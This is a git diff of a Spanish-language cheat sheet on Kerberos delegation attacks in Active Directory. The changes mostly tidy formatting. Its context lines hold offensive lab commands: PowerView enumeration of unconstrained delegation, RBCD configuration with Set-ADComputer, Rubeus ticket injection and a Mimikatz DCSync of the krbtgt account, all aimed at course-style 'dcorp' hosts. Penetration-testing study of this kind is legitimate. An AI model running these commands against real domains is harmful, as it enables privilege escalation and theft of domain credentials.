@@ -12,7 +12,6 @@ Kerberos es el protocolo de auntentiación que utiliza Active Directory por defe
 ![Imagen Kerberos](https://www.tarlogic.com/wp-content/uploads/2019/03/kerberosI-1200x900.png){width='75px'}
 
 ```console
-
 # Discover domain computers which have unconstrained delegation enabled using PowerView:
 Get-DomainComputer -UnConstrained    #(Cuando ejecutamos este comando siempre nos devolverá como resultado también al DOMAIN CONTROLLER (Ej: DCORP-DC$) pero tenemos que ignorar ese OUTPUT)
 
@@ -49,13 +48,13 @@ Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 # Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines :
 $comps = 'dcorp-student1$','dcorp-student2$'
 Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
-
 ```
+
 
 # UNCONSTRAINED DELEGATION
 
-```console powershell
 
+```console
 ################################################################################
 ############## UNCONSTRAINED DELEGATION - Privilege Escalation #################
 ################################################################################
@@ -96,7 +95,6 @@ Rubeus.exe ptt /tikcet:
 
 # Once the ticket is injected, run DCSync:
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
-
 ```
 
 # CONSTRAINED DELEGATION
@@ -108,7 +106,3 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 # RESOURCE BASED CONSTRAINED DELEGATION - RBCD
 
-
-### HOLA!
-
-ok
